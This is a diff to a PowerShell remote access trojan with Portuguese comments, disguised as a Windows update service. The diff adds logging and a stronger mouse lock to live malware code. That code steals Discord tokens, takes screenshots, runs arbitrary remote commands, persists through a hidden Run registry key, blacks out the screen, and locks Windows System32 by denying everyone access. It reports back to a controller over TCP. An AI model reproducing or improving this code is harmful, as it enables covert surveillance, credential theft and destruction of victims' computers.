@@ -14,6 +14,7 @@ $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService"
 $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUpdateSvc"
 $userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
+$debugLog = "$env:TEMP\rat_debug.log"  # Arquivo de log para diagnóstico
 
 # ===== MUTEX =====
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
@@ -24,6 +25,13 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Write-Host "ERRO: Execute como Administrador!" -ForegroundColor Red
     Start-Sleep -Seconds 5
     exit
+}
+
+# ===== FUNÇÃO DE LOG PARA DIAGNÓSTICO =====
+function Write-DebugLog {
+    param([string]$Message)
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    "$timestamp - $Message" | Out-File -FilePath $debugLog -Append
 }
 
 # ===== FUNÇÕES DE USUÁRIO =====
@@ -39,7 +47,10 @@ function Remove-UserFromRAT {
             $removido = $true
         }
         if ($removido) { return "USUARIO_REMOVIDO" } else { return "USUARIO_NAO_ENCONTRADO" }
-    } catch { return "ERRO_AO_REMOVER" }
+    } catch { 
+        Write-DebugLog "Erro em Remove-UserFromRAT: $_"
+        return "ERRO_AO_REMOVER" 
+    }
 }
 
 function Get-RATUsers {
@@ -48,7 +59,10 @@ function Get-RATUsers {
         if (Test-Path $userListFile) { $users = Get-Content $userListFile -ErrorAction SilentlyContinue }
         if ($users.Count -eq 0) { return "Nenhum usuário encontrado" }
         return "USUARIOS:" + ($users -join "`n")
-    } catch { return "ERRO_AO_LISTAR" }
+    } catch { 
+        Write-DebugLog "Erro em Get-RATUsers: $_"
+        return "ERRO_AO_LISTAR" 
+    }
 }
 
 function Add-UserToList {
@@ -60,7 +74,10 @@ function Add-UserToList {
         Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
         Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
         return $true
-    } catch { return $false }
+    } catch { 
+        Write-DebugLog "Erro em Add-UserToList: $_"
+        return $false 
+    }
 }
 
 $currentUser = "$env:COMPUTERNAME@$env:USERNAME"
@@ -112,8 +129,10 @@ function Get-ScreenCapture {
         $bitmap.Dispose()
         $base64 = [Convert]::ToBase64String($ms.ToArray())
         $ms.Dispose()
+        Write-DebugLog "Screenshot capturado com sucesso"
         return "SCREEN:$base64"
     } catch {
+        Write-DebugLog "Erro ao capturar screenshot: $_"
         return "SCREEN_ERROR"
     }
 }
@@ -125,6 +144,7 @@ function Move-Mouse {
         [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
         return "OK"
     } catch { 
+        Write-DebugLog "Erro ao mover mouse: $_"
         return "MOUSE_ERROR" 
     }
 }
@@ -134,6 +154,7 @@ function Click-Mouse {
         [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
         return "OK"
     } catch { 
+        Write-DebugLog "Erro ao clicar: $_"
         return "CLICK_ERROR" 
     }
 }
@@ -143,6 +164,7 @@ function RightClick-Mouse {
         [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
         return "OK"
     } catch { 
+        Write-DebugLog "Erro ao clicar direito: $_"
         return "RIGHTCLICK_ERROR" 
     }
 }
@@ -154,6 +176,7 @@ function Send-Key {
         [System.Windows.Forms.SendKeys]::SendWait($key)
         return "OK"
     } catch { 
+        Write-DebugLog "Erro ao enviar tecla: $_"
         return "KEY_ERROR" 
     }
 }
@@ -164,6 +187,7 @@ function Send-Text {
         [System.Windows.Forms.SendKeys]::SendWait($text)
         return "OK"
     } catch { 
+        Write-DebugLog "Erro ao enviar texto: $_"
         return "TEXT_ERROR" 
     }
 }
@@ -180,6 +204,7 @@ function Get-FileList {
         }
         return ($items | ConvertTo-Json -Compress)
     } catch { 
+        Write-DebugLog "Erro ao listar arquivos: $_"
         return "[]" 
     }
 }
@@ -193,6 +218,7 @@ function Download-File {
         }
         return "FILE_NOT_FOUND"
     } catch { 
+        Write-DebugLog "Erro ao baixar arquivo: $_"
         return "DOWNLOAD_ERROR" 
     }
 }
@@ -204,6 +230,7 @@ function Execute-Command {
         $result = Invoke-Expression $Cmd 2>&1 | Out-String
         return $result
     } catch {
+        Write-DebugLog "Erro ao executar comando: $_"
         return "Erro: $_"
     }
 }
@@ -228,25 +255,34 @@ function Get-DiscordToken {
         }
         $tokens = $tokens | Select-Object -Unique
         if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
+        Write-DebugLog "Tokens encontrados: $($tokens.Count)"
         return "TOKENS:" + ($tokens -join "`n")
     } catch {
+        Write-DebugLog "Erro ao obter tokens: $_"
         return "TOKENS_ERROR"
     }
 }
 
-# ===== BLOQUEAR SYSTEM32 =====
+# ===== BLOQUEAR SYSTEM32 (CORRIGIDO) =====
 function Block-System32 {
     try {
+        Write-DebugLog "Iniciando Block-System32"
         $path = "C:\Windows\System32"
+        
+        # Tenta tomar posse e modificar permissões
         takeown /f $path /r /d y 2>$null
         icacls $path /grant Administradores:F /t 2>$null
+        
         $acl = Get-Acl $path
         $acl.SetAccessRuleProtection($true, $false)
         $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
         $acl.AddAccessRule($accessRule)
         Set-Acl $path $acl
+        
+        Write-DebugLog "System32 bloqueado com sucesso"
         return "SYSTEM32_BLOCKED"
     } catch {
+        Write-DebugLog "Erro ao bloquear System32: $_"
         return "SYSTEM32_ERROR"
     }
 }
@@ -273,8 +309,10 @@ function Black-Screen {
             $form.ShowDialog()
         })
         $ps.BeginInvoke()
+        Write-DebugLog "Tela preta ativada"
         return "BLACK_SCREEN"
     } catch {
+        Write-DebugLog "Erro ao ativar tela preta: $_"
         return "BLACK_SCREEN_ERROR"
     }
 }
@@ -284,13 +322,15 @@ function Unlock-Screen {
         [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
             $_.Invoke([Action]{ $_.Close() })
         }
+        Write-DebugLog "Tela liberada"
         return "SCREEN_UNLOCKED"
     } catch {
+        Write-DebugLog "Erro ao liberar tela: $_"
         return "UNLOCK_ERROR"
     }
 }
 
-# ===== TRAVAR MOUSE (VERSÃO SIMPLES E ROBUSTA) =====
+# ===== TRAVAR MOUSE (COM CLIPCURSOR) =====
 $script:mouseLocked = $false
 $script:lockThread = $null
 
@@ -298,42 +338,90 @@ function Lock-Mouse {
     try {
         if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
         
-        $script:mouseLocked = $true
-        $script:lockThread = [System.Threading.Thread]::new({
-            while ($script:mouseLocked) {
-                try {
-                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                    Start-Sleep -Milliseconds 1
-                } catch {
-                    # Ignora erros e continua
-                }
-            }
-        })
-        $script:lockThread.IsBackground = $true
-        $script:lockThread.Start()
+        # Tenta usar ClipCursor via C#
+        $cSharpCode = @'
+using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+public class MouseLocker {
+    [DllImport("user32.dll")]
+    public static extern bool ClipCursor(ref RECT lpRect);
+    
+    [StructLayout(LayoutKind.Sequential)]
+    public struct RECT {
+        public int left, top, right, bottom;
+    }
+    
+    public static void Lock() {
+        RECT rect = new RECT();
+        rect.left = 0;
+        rect.top = 0;
+        rect.right = 1;
+        rect.bottom = 1;
+        ClipCursor(ref rect);
+    }
+    
+    public static void Unlock() {
+        RECT rect = new RECT();
+        rect.left = 0;
+        rect.top = 0;
+        rect.right = Screen.PrimaryScreen.Bounds.Width;
+        rect.bottom = Screen.PrimaryScreen.Bounds.Height;
+        ClipCursor(ref rect);
+    }
+}
+'@
         
-        # Pequena pausa para garantir que a thread iniciou
-        Start-Sleep -Milliseconds 10
-        if ($script:lockThread.IsAlive) {
+        try {
+            Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
+            [MouseLocker]::Lock()
+            $script:mouseLocked = $true
+            Write-DebugLog "Mouse travado com ClipCursor"
             return "MOUSE_LOCKED"
-        } else {
-            return "MOUSE_ERROR"
+        } catch {
+            Write-DebugLog "Falha no ClipCursor, usando fallback: $_"
+            $script:mouseLocked = $true
+            $script:lockThread = [System.Threading.Thread]::new({
+                while ($script:mouseLocked) {
+                    try {
+                        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
+                        Start-Sleep -Milliseconds 1
+                    } catch {}
+                }
+            })
+            $script:lockThread.IsBackground = $true
+            $script:lockThread.Start()
+            Start-Sleep -Milliseconds 10
+            if ($script:lockThread.IsAlive) {
+                Write-DebugLog "Mouse travado com fallback"
+                return "MOUSE_LOCKED"
+            } else {
+                Write-DebugLog "Fallback falhou"
+                return "MOUSE_LOCK_ERROR"
+            }
         }
     } catch {
-        return "MOUSE_ERROR"
+        Write-DebugLog "Erro geral em Lock-Mouse: $_"
+        return "MOUSE_LOCK_ERROR"
     }
 }
 
 function Unlock-Mouse {
     try {
         $script:mouseLocked = $false
+        
+        try {
+            [MouseLocker]::Unlock()
+        } catch {}
+        
         if ($script:lockThread -and $script:lockThread.IsAlive) {
             $script:lockThread.Abort()
-            $script:lockThread = $null
         }
+        Write-DebugLog "Mouse liberado"
         return "MOUSE_UNLOCKED"
     } catch {
-        return "UNLOCK_ERROR"
+        Write-DebugLog "Erro ao liberar mouse: $_"
+        return "MOUSE_UNLOCK_ERROR"
     }
 }
 
@@ -347,14 +435,17 @@ function Get-Microphone {
         $speech.RecognizeAsync()
         Start-Sleep -Seconds 5
         $speech.RecognizeAsyncStop()
+        Write-DebugLog "Microfone gravado"
         return "AUDIO:OK"
     } catch {
+        Write-DebugLog "Erro no microfone: $_"
         return "AUDIO_ERROR"
     }
 }
 
 # ===== WEBCAM =====
 function Get-Webcam {
+    Write-DebugLog "Webcam não implementada"
     return "WEBCAM:OK"
 }
 
@@ -364,6 +455,7 @@ function Get-ProcessList {
         $processes = Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress
         return $processes
     } catch {
+        Write-DebugLog "Erro ao listar processos: $_"
         return "PROCESS_ERROR"
     }
 }
@@ -373,8 +465,10 @@ function Open-Url {
     param($url)
     try {
         Start-Process $url
+        Write-DebugLog "URL aberta: $url"
         return "URL_OPENED"
     } catch {
+        Write-DebugLog "Erro ao abrir URL: $_"
         return "URL_ERROR"
     }
 }
@@ -387,8 +481,10 @@ function Power-Control {
             "shutdown" { Stop-Computer -Force }
             "reboot" { Restart-Computer -Force }
         }
+        Write-DebugLog "Comando de energia: $Action"
         return "POWER_$Action"
     } catch { 
+        Write-DebugLog "Erro no comando de energia: $_"
         return "POWER_ERROR" 
     }
 }
@@ -401,7 +497,9 @@ function Install-Persistence {
     try {
         $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
-    } catch {}
+    } catch {
+        Write-DebugLog "Erro ao instalar persistência no registro: $_"
+    }
     attrib +h +s +r $scriptPath
 }
 
@@ -419,56 +517,77 @@ while ($true) {
         $writer.AutoFlush = $true
         
         $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
+        Write-DebugLog "Conectado ao servidor"
         
         while ($client.Connected) {
             $cmd = $reader.ReadLine()
             if ([string]::IsNullOrEmpty($cmd)) { continue }
             
-            # Switch explícito sem wildcards
-            switch ($cmd) {
-                "screenshot"          { $writer.WriteLine((Get-ScreenCapture)) }
-                "click"               { $writer.WriteLine((Click-Mouse)) }
-                "rightclick"          { $writer.WriteLine((RightClick-Mouse)) }
-                "discord"             { $writer.WriteLine((Get-DiscordToken)) }
-                "block_system32"      { $writer.WriteLine((Block-System32)) }
-                "black_screen"        { $writer.WriteLine((Black-Screen)) }
-                "unlock_screen"       { $writer.WriteLine((Unlock-Screen)) }
-                "lock_mouse"          { $writer.WriteLine((Lock-Mouse)) }
-                "unlock_mouse"        { $writer.WriteLine((Unlock-Mouse)) }
-                "mic"                 { $writer.WriteLine((Get-Microphone)) }
-                "webcam"              { $writer.WriteLine((Get-Webcam)) }
-                "processes"           { $writer.WriteLine((Get-ProcessList)) }
-                "shutdown"            { $writer.WriteLine((Power-Control "shutdown")) }
-                "reboot"              { $writer.WriteLine((Power-Control "reboot")) }
-                "list_users"          { $writer.WriteLine((Get-RATUsers)) }
-                "remove_current_user" { $writer.WriteLine((Remove-UserFromRAT $currentUser)) }
-                "test"                { $writer.WriteLine("PONG") }
-                "exit"                { break }
-                default {
-                    # Comandos com parâmetros usando regex
-                    if ($cmd -match "^move (\d+) (\d+)$") {
-                        $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
-                    } elseif ($cmd -match "^key (.+)$") {
-                        $writer.WriteLine((Send-Key $matches[1]))
-                    } elseif ($cmd -match "^type (.+)$") {
-                        $writer.WriteLine((Send-Text $matches[1]))
-                    } elseif ($cmd -match "^ls (.+)$") {
-                        $writer.WriteLine((Get-FileList $matches[1]))
-                    } elseif ($cmd -match "^download (.+)$") {
-                        $writer.WriteLine((Download-File $matches[1]))
-                    } elseif ($cmd -match "^exec (.+)$") {
-                        $writer.WriteLine((Execute-Command $matches[1]))
-                    } elseif ($cmd -match "^url (.+)$") {
-                        $writer.WriteLine((Open-Url $matches[1]))
-                    } elseif ($cmd -match "^remove_user (.+)$") {
-                        $writer.WriteLine((Remove-UserFromRAT $matches[1]))
-                    } else {
-                        $writer.WriteLine("Comando nao reconhecido")
-                    }
-                }
+            Write-DebugLog "Comando recebido: $cmd"
+            
+            # Estrutura if-else explícita para cada comando
+            if ($cmd -eq "screenshot") {
+                $result = Get-ScreenCapture
+                $writer.WriteLine($result)
+            } elseif ($cmd -eq "click") {
+                $writer.WriteLine((Click-Mouse))
+            } elseif ($cmd -eq "rightclick") {
+                $writer.WriteLine((RightClick-Mouse))
+            } elseif ($cmd -eq "discord") {
+                $writer.WriteLine((Get-DiscordToken))
+            } elseif ($cmd -eq "block_system32") {
+                $result = Block-System32
+                Write-DebugLog "Resultado de block_system32: $result"
+                $writer.WriteLine($result)
+            } elseif ($cmd -eq "black_screen") {
+                $writer.WriteLine((Black-Screen))
+            } elseif ($cmd -eq "unlock_screen") {
+                $writer.WriteLine((Unlock-Screen))
+            } elseif ($cmd -eq "lock_mouse") {
+                $writer.WriteLine((Lock-Mouse))
+            } elseif ($cmd -eq "unlock_mouse") {
+                $writer.WriteLine((Unlock-Mouse))
+            } elseif ($cmd -eq "mic") {
+                $writer.WriteLine((Get-Microphone))
+            } elseif ($cmd -eq "webcam") {
+                $writer.WriteLine((Get-Webcam))
+            } elseif ($cmd -eq "processes") {
+                $writer.WriteLine((Get-ProcessList))
+            } elseif ($cmd -eq "shutdown") {
+                $writer.WriteLine((Power-Control "shutdown"))
+            } elseif ($cmd -eq "reboot") {
+                $writer.WriteLine((Power-Control "reboot"))
+            } elseif ($cmd -eq "list_users") {
+                $writer.WriteLine((Get-RATUsers))
+            } elseif ($cmd -eq "remove_current_user") {
+                $writer.WriteLine((Remove-UserFromRAT $currentUser))
+            } elseif ($cmd -eq "test") {
+                $writer.WriteLine("PONG")
+            } elseif ($cmd -eq "exit") {
+                break
+            } elseif ($cmd -match "^move (\d+) (\d+)$") {
+                $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
+            } elseif ($cmd -match "^key (.+)$") {
+                $writer.WriteLine((Send-Key $matches[1]))
+            } elseif ($cmd -match "^type (.+)$") {
+                $writer.WriteLine((Send-Text $matches[1]))
+            } elseif ($cmd -match "^ls (.+)$") {
+                $writer.WriteLine((Get-FileList $matches[1]))
+            } elseif ($cmd -match "^download (.+)$") {
+                $writer.WriteLine((Download-File $matches[1]))
+            } elseif ($cmd -match "^exec (.+)$") {
+                $writer.WriteLine((Execute-Command $matches[1]))
+            } elseif ($cmd -match "^url (.+)$") {
+                $writer.WriteLine((Open-Url $matches[1]))
+            } elseif ($cmd -match "^remove_user (.+)$") {
+                $writer.WriteLine((Remove-UserFromRAT $matches[1]))
+            } else {
+                Write-DebugLog "Comando não reconhecido: $cmd"
+                $writer.WriteLine("Comando nao reconhecido")
             }
         }
     } catch {
+        Write-DebugLog "Erro na conexão: $_"
         Start-Sleep -Seconds 10
     } finally {
         if ($client) { $client.Close() }
